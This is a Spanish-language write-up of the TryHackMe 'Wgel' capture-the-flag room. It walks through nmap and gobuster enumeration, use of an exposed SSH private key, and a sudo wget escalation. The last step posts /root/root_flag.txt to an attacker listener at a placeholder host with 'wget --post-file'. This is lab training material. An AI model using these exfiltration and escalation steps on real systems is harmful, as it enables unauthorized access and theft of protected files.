# 🐧 TryHackMe - Wgel CTF Writeup

La sala **"Wgel"** de TryHackMe es un CTF de dificultad *fácil* centrado en tres pilares:  
- 🔍 reconocimiento y escaneo  
- 📂 fuerza bruta de directorios  
- 🚀 escalada de privilegios para obtener acceso `root`  

En este writeup iremos explicando, paso a paso, cómo completar la máquina, mostrando los comandos usados y el razonamiento detrás de cada acción.

---

## 1️⃣ Comprobando conectividad – Ping

Lo primero que hago siempre al empezar una máquina es verificar la conectividad con un `ping`:

````bash
ping -c 4 10.80.156.139
````
- `-c 4` envía 4 paquetes ICMP.
- Todas las respuestas vuelven correctamente (`0% packet loss`), así que la máquina está activa y podemos continuar con el escaneo.

<img width="672" height="269" alt="Ping" src="https://github.com/user-attachments/assets/8dc514fc-394b-443c-827b-787b0410664d" />

---

## 2️⃣ Escaneo de puertos con Nmap 🔍

El siguiente paso es identificar qué servicios expone la máquina. Para ello lancé un escaneo agresivo con `nmap`:

````bash
nmap -p- -sV -sC --open --min-rate 5000 -vvv -n -Pn -oN escaneo 10.80.156.139
````

Explicación rápida de las opciones más importantes:

- `-p-` → escanea **todos** los puertos (1–65535).
- `-sV` → detección de versión de los servicios.
- `-sC` → ejecuta los **scripts por defecto** de Nmap.
- `--open` → solo muestra puertos abiertos.
- `-Pn` → no hace ping previo (trata al host como “up”).
- `-oN escaneo` → guarda el resultado en el fichero `escaneo`.

Del resultado destacan:

- Puerto `22/tcp` abierto: servicio **SSH** (`OpenSSH 7.2p2 Ubuntu 4ubuntu2.8`).
- Puerto `80/tcp` abierto: servicio **HTTP** con **Apache 2.4.18** y página por defecto de Ubuntu.

Esto nos indica que el vector más interesante para empezar será el servicio web en el puerto 80.

<img width="1872" height="627" alt="NMap" src="https://github.com/user-attachments/assets/2f12e92d-5454-475d-8bac-a0c2b192e85f" />

---

## 3️⃣ Exploración del servicio web en el puerto 80 🌐

Accedemos a la IP de la máquina desde el navegador:

````html
http://10.80.156.139/
````

Se muestra la **página por defecto de Apache en Ubuntu**.

<img width="1457" height="840" alt="PAgina puerto 80" src="https://github.com/user-attachments/assets/214f212b-f4aa-4c7a-bafa-d19c5adf7d9a" />

### 3.1 Código fuente de la página 🧾

Siempre es buena idea revisar el código fuente en busca de comentarios o pistas ocultas.  
Al abrir el código fuente, encontramos el siguiente comentario HTML:
````text
<!-- Jessie don't forget to update the website -->
````

Esto nos da una posible **pista de usuario**: `jessie`.

<img width="1139" height="581" alt="codigo fuente pagina" src="https://github.com/user-attachments/assets/b6bbaa9d-0c96-461a-ad1a-818bc3df4fc9" />

---

## 4️⃣ Fuerza bruta de directorios con Gobuster 📂

Para enumerar directorios y archivos ocultos en el servidor web, utilicé `gobuster`:

````bash
gobuster dir -u http://10.80.156.139/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
````

Parámetros utilizados:

- `dir` → modo de enumeración de directorios.
- `-u` → URL objetivo.
- `-w` → wordlist (diccionario de palabras).
- `-x` → extensiones a buscar (php, html, txt).

### Resultados interesantes:

De todos los resultados con `Status: 403` (acceso denegado), destacan dos respuestas con **Status: 200** (acceso permitido):

- `/index.html` → la página principal que ya vimos.
- **`/sitemap/`** → directorio accesible con **Status: 301** (redirección).

El directorio `/sitemap/` parece prometedor para investigar.

<img width="921" height="461" alt="gobuster" src="https://github.com/user-attachments/assets/9ad4aae1-4810-4dbd-83c0-f1c4fc3e5af3" />

---

## 5️⃣ Acceso a `/sitemap/` y nueva enumeración con Gobuster 🌍

Al acceder al directorio `/sitemap/` en el navegador vemos una web llamada **UNAPP**, con varias secciones (Home, Works, Services, Blog, About, Shop, Contact).

<img width="1344" height="652" alt="PAgina sitemap" src="https://github.com/user-attachments/assets/c9c23263-23b6-4d5f-a419-6596add45f7c" />

Para buscar contenido oculto dentro de `/sitemap/`, lanzamos de nuevo `gobuster`, esta vez sobre esta ruta:

````bash
gobuster dir -u http://10.80.156.139/sitemap/
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-x php,html,txt
````

Entre los resultados aparecen varios archivos HTML interesantes:

- `/about.html`
- `/blog.html`
- `/contact.html`
- `/services.html`
- `/shop.html`
- `/work.html`

<img width="940" height="411" alt="gobuster a site" src="https://github.com/user-attachments/assets/1823a586-5a6c-43ba-ac1e-86e55a6aed8a" />

---

## 6️⃣ Descubriendo el directorio oculto `.ssh` y la clave privada 🔑

Siguiendo con la enumeración dentro de `/sitemap/`, encontramos un directorio oculto muy interesante:

````html
/sitemap/.ssh/
````

Al acceder desde el navegador, vemos un listado de archivos con un fichero llamado `id_rsa`, que corresponde a una **clave privada SSH**.

<img width="782" height="379" alt="encontramos clave ssh" src="https://github.com/user-attachments/assets/58242a50-8205-4292-a940-68898fe0fda4" />

---

## 7️⃣ Uso de la clave SSH y obtención de la user flag 🧑‍💻

Una vez descargado el fichero `id_rsa`, le damos los permisos correctos:

````bash
chmod 600 id_rsa
````

Con la pista del comentario HTML (`Jessie`) probamos a conectarnos por SSH usando la clave privada:

````bash
ssh jessie@10.80.156.139 -i id_rsa
````

La autenticación tiene éxito y accedemos como el usuario `jessie`.

<img width="725" height="516" alt="me conecto por ssh y obtengo flag user" src="https://github.com/user-attachments/assets/e4f7a824-076d-4405-a8b4-4871a5901258" />

Comprobamos el usuario y localización:

````bash
whoami
pwd
ls
cd Documents
ls
cat user_flag.txt
````

En `Documents` encontramos y leemos `user_flag.txt`, obteniendo así la **user flag**.

---

## 8️⃣ Comprobación de permisos sudo: wget como root ⚙️

Desde la sesión SSH con `jessie`, revisamos qué comandos puede ejecutar con `sudo`:

````bash
sudo -l
````

La salida muestra que el usuario `jessie` puede ejecutar **`/usr/bin/wget` como root sin contraseña**:

````bash
User jessie may run the following commands on CorpOne:
(root) NOPASSWD: /usr/bin/wget
````

<img width="883" height="412" alt="permisos ususario" src="https://github.com/user-attachments/assets/ea9a218e-3b32-42fe-94f7-7be2dcb69892" />

Esto es clave: podremos abusar de `wget` para conseguir una **shell como root**.

---

## 9️⃣ Abusando de wget para leer la root flag 📡👑

Sabemos que `jessie` puede ejecutar `wget` como root, así que lo usamos para enviar el contenido de la `root_flag.txt` a nuestra máquina.

1. En nuestra máquina atacante, ponemos un servidor en escucha en el puerto 80:

````bash
sudo nc -nlvp 80
````

2. Desde la máquina víctima (como `jessie`), ejecutamos:

````bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://TU_IP:80/
````

Al hacerlo, `wget` (ejecutado como root) envía el contenido de `/root/root_flag.txt` a través de una petición HTTP POST hacia nuestra máquina.  
En la terminal donde estaba `nc` en escucha vemos la **root flag** en claro.

<img width="675" height="501" alt="pongo en escucha puerto 80 y con wget enviamos la flag root" src="https://github.com/user-attachments/assets/c4f4c376-a130-4a7e-83d7-0a3e8eadefda" />

Con esto, completamos la máquina obteniendo tanto la **user flag** como la **root flag** ✅.

---











